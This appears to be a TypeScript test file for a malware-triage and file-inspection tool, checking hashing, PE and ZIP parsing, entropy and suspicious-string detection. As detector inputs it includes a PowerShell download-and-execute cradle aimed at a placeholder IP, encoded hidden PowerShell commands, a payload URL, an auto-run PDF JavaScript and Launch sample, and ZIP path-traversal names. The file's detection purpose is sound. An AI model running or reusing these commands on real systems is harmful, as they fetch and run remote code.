import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { createHash, randomBytes } from 'node:crypto';
import { analyzeFile, analyzeStrings, detectType, extensionOf, inspect, md5, parsePE, parseZip, shannonEntropy } from '../shared/fileAnalysis';
import { normalizeHash } from '../shared/fileHash';

const te = (s: string) => new Uint8Array(Buffer.from(s, 'latin1'));
const titles = (r: { findings: { title: string }[] }) => r.findings.map((f) => f.title);
const has = (r: { findings: { title: string }[] }, re: RegExp) => r.findings.some((f) => re.test(f.title));

/** Builds a minimal but structurally valid 32-bit PE with an import table, so the parser is tested on real layout. */
function buildPE(opts: { sections?: { name: string; flags: number; data?: Uint8Array; vsize?: number }[]; imports?: string[]; dll?: string; timestamp?: number } = {}): Uint8Array {
  const sections = opts.sections ?? [{ name: '.text', flags: 0x60000020 }, { name: '.idata', flags: 0xc0000040 }];
  const buf = new Uint8Array(0x1000);
  const dv = new DataView(buf.buffer);
  buf[0] = 0x4d; buf[1] = 0x5a; dv.setUint32(0x3c, 0x80, true);
  buf.set([0x50, 0x45, 0, 0], 0x80);
  dv.setUint16(0x84, 0x14c, true); dv.setUint16(0x86, sections.length, true); dv.setUint32(0x88, opts.timestamp ?? 1_700_000_000, true);
  dv.setUint16(0x94, 0xe0, true); dv.setUint16(0x96, 0x102, true);
  const opt = 0x98;
  dv.setUint16(opt, 0x10b, true); dv.setUint32(opt + 16, 0x1000, true); dv.setUint16(opt + 68, 3, true); dv.setUint32(opt + 92, 16, true);
  const idataIndex = sections.findIndex((s) => s.name === '.idata');
  if (idataIndex >= 0) dv.setUint32(opt + 96 + 8, 0x2000, true); // import directory RVA
  const secTable = opt + 0xe0;
  sections.forEach((s, i) => {
    const o = secTable + i * 40;
    for (let k = 0; k < s.name.length; k++) buf[o + k] = s.name.charCodeAt(k);
    const isIdata = s.name === '.idata';
    dv.setUint32(o + 8, s.vsize ?? 0x200, true);
    dv.setUint32(o + 12, i === idataIndex ? 0x2000 : 0x1000 + i * 0x2000, true);
    dv.setUint32(o + 16, s.data ? s.data.length : 0x200, true);
    dv.setUint32(o + 20, 0x200 + i * 0x200, true);
    dv.setUint32(o + 36, s.flags, true);
    if (s.data && !isIdata) buf.set(s.data, 0x200 + i * 0x200);
  });
  if (idataIndex >= 0) {
    const base = 0x200 + idataIndex * 0x200; // file offset of .idata; its RVA is 0x2000
    const off = (rva: number) => base + (rva - 0x2000);
    const fns = opts.imports ?? ['ExitProcess'];
    dv.setUint32(off(0x2000), 0x2040, true); // OriginalFirstThunk
    dv.setUint32(off(0x2000) + 12, 0x2060, true); // Name
    dv.setUint32(off(0x2000) + 16, 0x2040, true); // FirstThunk
    const dll = opts.dll ?? 'kernel32.dll';
    for (let i = 0; i < dll.length; i++) buf[off(0x2060) + i] = dll.charCodeAt(i);
    let hint = 0x2080;
    fns.forEach((f, i) => {
      dv.setUint32(off(0x2040) + i * 4, hint, true);
      for (let k = 0; k < f.length; k++) buf[off(hint) + 2 + k] = f.charCodeAt(k);
      hint += 2 + f.length + 2;
    });
  }
  return buf;
}

/** Minimal ZIP (stored entries) with local headers + central directory + EOCD. */
function buildZip(entries: { name: string; encrypted?: boolean; data?: string }[]): Uint8Array {
  const parts: Buffer[] = [];
  const central: Buffer[] = [];
  let offset = 0;
  for (const e of entries) {
    const name = Buffer.from(e.name, 'latin1');
    const data = Buffer.from(e.data ?? 'x');
    const flags = e.encrypted ? 1 : 0;
    const lh = Buffer.alloc(30);
    lh.writeUInt32LE(0x04034b50, 0); lh.writeUInt16LE(20, 4); lh.writeUInt16LE(flags, 6); lh.writeUInt32LE(data.length, 18); lh.writeUInt32LE(data.length, 22); lh.writeUInt16LE(name.length, 26);
    parts.push(lh, name, data);
    const ch = Buffer.alloc(46);
    ch.writeUInt32LE(0x02014b50, 0); ch.writeUInt16LE(20, 4); ch.writeUInt16LE(20, 6); ch.writeUInt16LE(flags, 8);
    ch.writeUInt32LE(data.length, 20); ch.writeUInt32LE(data.length, 24); ch.writeUInt16LE(name.length, 28); ch.writeUInt32LE(offset, 42);
    central.push(ch, name);
    offset += lh.length + name.length + data.length;
  }
  const cd = Buffer.concat(central);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0); eocd.writeUInt16LE(entries.length, 8); eocd.writeUInt16LE(entries.length, 10); eocd.writeUInt32LE(cd.length, 12); eocd.writeUInt32LE(offset, 16);
  return new Uint8Array(Buffer.concat([...parts, cd, eocd]));
}

describe('hashes', () => {
  it('md5 matches known vectors and node:crypto for varied lengths', () => {
    assert.equal(md5(te('')), 'd41d8cd98f00b204e9800998ecf8427e');
    assert.equal(md5(te('abc')), '900150983cd24fb0d6963f7d28e17f72');
    for (const n of [1, 55, 56, 57, 63, 64, 65, 119, 120, 1000, 65_537]) {
      const b = randomBytes(n);
      assert.equal(md5(new Uint8Array(b)), createHash('md5').update(b).digest('hex'), `length ${n}`);
    }
  });
  it('analyzeFile returns md5, sha1 and sha256 that match node:crypto', async () => {
    const b = randomBytes(5000);
    const r = await analyzeFile(new Uint8Array(b), 'x.bin');
    assert.equal(r.md5, createHash('md5').update(b).digest('hex'));
    assert.equal(r.sha1, createHash('sha1').update(b).digest('hex'));
    assert.equal(r.sha256, createHash('sha256').update(b).digest('hex'));
  });
  it('normalizeHash accepts md5/sha1/sha256 only', () => {
    assert.deepEqual(normalizeHash(' D41D8CD98F00B204E9800998ECF8427E '), { hash: 'd41d8cd98f00b204e9800998ecf8427e', algo: 'md5' });
    assert.equal(normalizeHash('a'.repeat(40))?.algo, 'sha1');
    assert.equal(normalizeHash('a'.repeat(64))?.algo, 'sha256');
    assert.equal(normalizeHash('a'.repeat(33)), null);
    assert.equal(normalizeHash('z'.repeat(32)), null);
    assert.equal(normalizeHash(''), null);
  });
});

describe('type detection and name checks', () => {
  it('detects common types from magic bytes, not the extension', () => {
    assert.equal(detectType(buildPE()).id, 'pe');
    assert.equal(detectType(te('%PDF-1.7\n')).id, 'pdf');
    assert.equal(detectType(buildZip([{ name: 'a.txt' }])).id, 'zip');
    assert.equal(detectType(new Uint8Array([0x7f, 0x45, 0x4c, 0x46, 2, 1, 1])).id, 'elf');
    assert.equal(detectType(new Uint8Array([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1])).id, 'ole');
    assert.equal(detectType(te('{\\rtf1\\ansi hello}')).id, 'rtf');
    assert.equal(detectType(te('#!/bin/sh\necho hi')).id, 'script');
    assert.equal(detectType(randomBytes(300)).id, 'unknown');
  });
  it('extensionOf handles odd names', () => {
    assert.equal(extensionOf('a.PDF'), 'pdf');
    assert.equal(extensionOf('C:\\x\\y.tar.gz'), 'gz');
    assert.equal(extensionOf('noext'), null);
    assert.equal(extensionOf('.hidden'), null);
  });
  it('flags a PE disguised as a PDF and a double extension', () => {
    const r = inspect(buildPE(), 'invoice.pdf');
    assert.ok(has(r, /does not match the content/));
    assert.ok(has(r, /Executable code with a document/));
    assert.equal(r.level, 'high');
    assert.ok(has(inspect(te('x'), 'report.pdf.exe'), /Double extension/));
    assert.ok(has(inspect(te('x'), 'photo.jpg.scr'), /Double extension/));
  });
  it('flags right-to-left override in the filename', () => {
    assert.ok(has(inspect(te('x'), 'invoice\u202Efdp.exe'), /right-to-left/));
  });
  it('does not flag a genuine PDF with a pdf extension', () => {
    const r = inspect(te('%PDF-1.4\n1 0 obj<<>>endobj\n%%EOF'), 'ok.pdf');
    assert.ok(!has(r, /does not match/));
    assert.equal(r.level, 'no-findings');
  });
});

describe('entropy', () => {
  it('is 0 for constant data and near 8 for random data', () => {
    assert.equal(shannonEntropy(new Uint8Array(1000)), 0);
    assert.ok(shannonEntropy(new Uint8Array(randomBytes(200_000))) > 7.9);
  });
  it('flags high-entropy unknown blobs but not already-compressed formats', () => {
    assert.ok(has(inspect(new Uint8Array(randomBytes(50_000)), 'data.bin'), /Very high entropy/));
    const png = new Uint8Array(50_000); png.set([0x89, 0x50, 0x4e, 0x47]); png.set(randomBytes(49_000), 100);
    assert.ok(!has(inspect(png, 'a.png'), /Very high entropy/));
  });
});

describe('PE parsing', () => {
  it('parses headers, sections and imports from a real layout', () => {
    const pe = parsePE(buildPE({ imports: ['ExitProcess', 'GetStdHandle'] }))!;
    assert.equal(pe.bits, 32);
    assert.equal(pe.machine, 'x86 (i386)');
    assert.equal(pe.subsystem, 'Windows console');
    assert.equal(pe.sections.map((s) => s.name).join(), '.text,.idata');
    assert.equal(pe.sections[0].executable, true);
    assert.deepEqual(pe.imports[0], { dll: 'kernel32.dll', functions: ['ExitProcess', 'GetStdHandle'] });
    assert.equal(pe.timestamp, new Date(1_700_000_000 * 1000).toISOString());
  });
  it('flags injection-style imports as high', () => {
    const r = inspect(buildPE({ imports: ['VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread', 'ExitProcess'] }), 'a.exe');
    assert.ok(has(r, /injection\/evasion/));
    assert.ok(r.pe!.suspiciousImports.includes('CreateRemoteThread'));
  });
  it('flags packer sections, W+X sections and an empty import table', () => {
    const r = inspect(buildPE({ sections: [{ name: 'UPX0', flags: 0xe0000080 }, { name: 'UPX1', flags: 0xe0000020 }], imports: [] }), 'a.exe');
    assert.ok(has(r, /Packer-style section/));
    assert.ok(has(r, /writable and executable/));
  });
  it('is robust to truncated and garbage headers', () => {
    const good = buildPE();
    for (const n of [2, 0x40, 0x84, 0x98, 0x120, 0x200, 0x300]) assert.doesNotThrow(() => inspect(good.subarray(0, n), 'a.exe'));
    const evil = new Uint8Array(good); evil.fill(0xff, 0x98, 0x1c8);
    assert.doesNotThrow(() => inspect(evil, 'a.exe'));
    const noPe = new Uint8Array(200); noPe[0] = 0x4d; noPe[1] = 0x5a; noPe[0x3c] = 0xf0;
    assert.equal(parsePE(noPe), null);
  });
});

describe('ZIP / Office containers', () => {
  it('lists entries and flags VBA macros in an OOXML file', () => {
    const z = buildZip([{ name: '[Content_Types].xml' }, { name: 'word/document.xml' }, { name: 'word/vbaProject.bin' }]);
    assert.equal(parseZip(z)!.entries.length, 3);
    const r = inspect(z, 'invoice.docx');
    assert.ok(has(r, /VBA macro/));
    assert.equal(r.archive!.totalEntries, 3);
    assert.ok(!has(r, /does not match/));
  });
  it('flags executables and encrypted entries in plain archives', () => {
    const r = inspect(buildZip([{ name: 'setup.exe', encrypted: true }, { name: 'readme.txt' }]), 'bundle.zip');
    assert.ok(has(r, /executable or script files/));
    assert.ok(has(r, /password-protected/));
  });
  it('flags path traversal entries', () => {
    assert.ok(has(inspect(buildZip([{ name: '../../evil.dll' }]), 'a.zip'), /path traversal/));
  });
  it('does not treat a macro-free docx as suspicious', () => {
    const r = inspect(buildZip([{ name: '[Content_Types].xml' }, { name: 'word/document.xml' }]), 'ok.docx');
    assert.equal(r.level, 'no-findings');
  });
  it('survives a corrupt central directory', () => {
    const z = buildZip([{ name: 'a.txt' }]);
    const bad = new Uint8Array(z); bad.fill(0xff, bad.length - 40, bad.length - 22);
    assert.doesNotThrow(() => inspect(bad, 'a.zip'));
  });
});

describe('PDF, RTF, OLE, scripts', () => {
  it('PDF with auto-run JavaScript is high; obfuscated names and Launch are flagged', () => {
    const r = inspect(te('%PDF-1.5\n1 0 obj<</OpenAction 2 0 R /Type/Catalog>>endobj 2 0 obj<</S/JavaScript /JS(app.alert(1))>>endobj'), 'a.pdf');
    assert.ok(has(r, /runs JavaScript automatically/));
    assert.ok(has(inspect(te('%PDF-1.5\n<</S/Launch /F(cmd.exe)>>'), 'a.pdf'), /launch external programs/));
    assert.ok(has(inspect(te('%PDF-1.5\n<</J#61vaScript 1>>'), 'a.pdf'), /obfuscated/));
  });
  it('RTF with embedded objects is high', () => {
    assert.ok(has(inspect(te('{\\rtf1{\\object\\objemb{\\*\\objdata 0105}}}'), 'a.rtf'), /embedded OLE/));
  });
  it('legacy Office with VBA and auto-open is high', () => {
    const wide = (s: string) => Buffer.from(s, 'utf16le');
    const body = Buffer.concat([Buffer.from([0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]), Buffer.alloc(100), wide('_VBA_PROJECT'), Buffer.alloc(20), Buffer.from('Attribute VB_Name = "ThisDocument"\nSub AutoOpen()\n'), Buffer.alloc(50)]);
    const r = inspect(new Uint8Array(body), 'old.doc');
    assert.ok(has(r, /VBA macros/));
    assert.ok(has(r, /automatically when the file is opened/));
  });
  it('encoded PowerShell and download cradles are flagged', () => {
    assert.ok(has(inspect(te('powershell.exe -NoP -W Hidden -enc SQBFAFgA'), 'a.ps1'), /Encoded PowerShell/));
    assert.ok(has(inspect(te('IEX (New-Object Net.WebClient).DownloadString("http://1.2.3.4/a")'), 'a.ps1'), /download-and-execute/));
    assert.ok(has(inspect(te('var s=new ActiveXObject("WScript.Shell"); s.Run("calc")'), 'a.js'), /WScript\.Shell/));
  });
  it('harmless text yields no findings', () => {
    assert.equal(inspect(te('hello world, this is a normal note about lunch.'), 'note.txt').level, 'no-findings');
  });
  it('empty file does not crash', () => {
    const r = inspect(new Uint8Array(0), 'empty.bin');
    assert.equal(r.size, 0);
    assert.ok(has(r, /empty/));
  });
});

describe('strings', () => {
  it('extracts ASCII and UTF-16 URLs, IPs, emails, registry keys and suspicious terms', () => {
    const body = Buffer.concat([
      Buffer.from('junk\0\0http://evil.example.com/payload.exe\0 contact: bad@evil.example.com 203.0.113.9 HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\x\0'),
      Buffer.from('http://wide.example.net/a', 'utf16le'),
      Buffer.from('\0\0cmd.exe /c powershell -enc AAAA'),
    ]);
    const s = analyzeStrings(new Uint8Array(body));
    assert.ok(s.urls.includes('http://evil.example.com/payload.exe'));
    assert.ok(s.urls.includes('http://wide.example.net/a'));
    assert.ok(s.ips.includes('203.0.113.9'));
    assert.ok(s.emails.includes('bad@evil.example.com'));
    assert.ok(s.registryKeys.some((k) => /CurrentVersion\\Run/.test(k)));
    assert.ok(s.suspicious.includes('powershell') && s.suspicious.includes('cmd.exe'));
  });
  it('ignores version-number-like and loopback addresses', () => {
    assert.deepEqual(analyzeStrings(te('version 0.1.2.3 and 127.0.0.1 and 255.255.255.255')).ips, []);
  });
  it('caps result sizes on huge inputs', () => {
    const many = Array.from({ length: 500 }, (_, i) => `http://host${i}.example.com/x`).join('\n');
    assert.ok(analyzeStrings(te(many)).urls.length <= 40);
  });
});

describe('scoring', () => {
  it('score stays within 0-100 and levels are ordered', () => {
    const worst = inspect(buildPE({ sections: [{ name: 'UPX0', flags: 0xe0000080 }], imports: ['VirtualAllocEx', 'WriteProcessMemory', 'CreateRemoteThread'] }), 'invoice.pdf.exe');
    assert.ok(worst.score <= 100 && worst.score > 45);
    assert.equal(worst.level, 'high');
    assert.equal(inspect(te('plain text'), 'a.txt').score, 0);
  });
  it('a clean-looking result never claims the file is safe', () => {
    const r = inspect(te('plain text'), 'a.txt');
    assert.ok(r.findings.every((f) => !/\bsafe\b/i.test(f.title) || /not proof/i.test(f.detail ?? '')));
  });
});
